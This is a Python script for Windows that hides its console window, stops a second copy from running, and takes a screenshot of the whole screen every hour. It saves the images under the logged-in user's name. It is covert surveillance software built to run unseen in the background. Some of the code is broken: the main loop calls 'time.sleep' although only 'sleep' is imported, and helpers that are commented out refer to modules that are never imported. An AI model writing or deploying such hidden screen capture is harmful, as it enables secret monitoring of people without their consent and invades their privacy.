#!/usr/scripts/python
# -*- coding: utf-8 -*-

import win32gui, win32console, win32gui, win32ui, win32con, win32api
from PIL import Image, ImageGrab
import datetime
import os
import sys
from time import sleep
import schedule
import win32event, win32api,winerror

mutex = win32event.CreateMutex(None, 2, 'mutex_var_xbox')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print("no")
    sys.exit(0)

def hide():
    """
    Uses windows GUI commands to grab the console and hide it so it runs in the background.
    :return:
    """
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

# def screenshot():
#     """
#     takes screen shot of full window and saves it as jpeg with similar naming format as log files
#     :return:
#     """
#     image = ImageGrab.grab()
#     time = datetime.datetime.now().strftime("%Y-%m-%d %H%M")
#     outfile = "{}_{}.jpg".format(tracked_user_name, time)
#     try:
#         image.save(outfile)
#     except:
#         pass
#         # print(sys.exc_info()[0]) for debugging
#         # print(traceback.format_exc())

def screenshot():
    hwin = win32gui.GetDesktopWindow()
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN) # *2.5
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN) # *2.5
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
    hwindc = win32gui.GetWindowDC(hwin)
    srcdc = win32ui.CreateDCFromHandle(hwindc)
    memdc = srcdc.CreateCompatibleDC()
    bmp = win32ui.CreateBitmap()
    bmp.CreateCompatibleBitmap(srcdc, width, height)
    memdc.SelectObject(bmp)
    memdc.BitBlt((0, 0), (width, height), srcdc, (left, top), win32con.SRCCOPY)
    time = datetime.datetime.now().strftime("%Y-%m-%d %H%M")
    outfile = "{}_{}".format(tracked_user_name, time)
    bmp.SaveBitmapFile(memdc, outfile+'.bmp')
    sleep(3)
    Image.open(outfile+'.bmp').save(outfile+'.jpg')
    sleep(3)
    os.remove(outfile+'.bmp')



# def schedule_screenshots():
#     """
#     schedules screenshots to be taken every hour from the time the software boots up, for 8 hours starting immediately.
#
#     Unused, in favor of schedule_alt()'s multithreading.
#     :return:
#     """
#     s = sched.scheduler(time.time,time.sleep)
#     for i in range(9):
#         s.enter(i*60*60,1,screenshot)
#     s.run()
#
# def schedule_alt():
#     """
#     schedules screenshots to be taken every hour from the time the software boots up, for 8 hours starting immediately.
#     Multithreaded. Maybe can adapt this and schedule_screenshots to work together.
#     :return:
#     """
#     for i in range(9):
#         t = Timer(i*60*60,screenshot)
#         t.start()


if __name__ == "__main__":
    hide()  # hides UI immediately
    #schedule_screenshots() unused in favor of schedule_alt()
    #schedule_alt()
    tracked_user_name = os.environ.get("USERNAME")  # has to have a username
    schedule.every().hour.do(screenshot)

    while True:
        schedule.run_pending()
        time.sleep(1)
